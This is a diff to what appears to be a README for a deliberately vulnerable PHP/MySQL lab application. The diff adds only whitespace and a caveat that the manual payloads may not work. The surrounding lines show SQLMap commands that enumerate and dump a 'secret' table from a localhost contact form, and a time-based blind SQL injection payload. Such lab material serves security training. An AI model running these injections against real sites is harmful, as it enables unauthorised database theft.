@@ -42,7 +42,7 @@ This is a PHP-based web application with a MySQL database that simulates a simpl
 
 **Tools Required:** SQLMap or manual SQL injection
 
-**SQLMap Commands:**
+**SQLMap Commands:** 
 \`\`\`bash
 # 1. Enumerate databases and tables to find 'dcsc' DB and 'secret' table
 sqlmap -u "http://localhost/contact.php" --dbs --tables --forms
@@ -51,7 +51,7 @@ sqlmap -u "http://localhost/contact.php" --dbs --tables --forms
 sqlmap -u "http://localhost/contact.php" -D dcsc -T secret --dump --forms
 \`\`\`
 
-**Manual SQL Injection Payloads:**
+**Manual SQL Injection Payloads (The Manual Payloads MAY NOT WORK):** 
 \`\`\`sql
 # Time-based blind SQLi detection
 ' AND (SELECT 1569 FROM (SELECT(SLEEP(5)))mtZf) AND 'HJsW'='HJsW
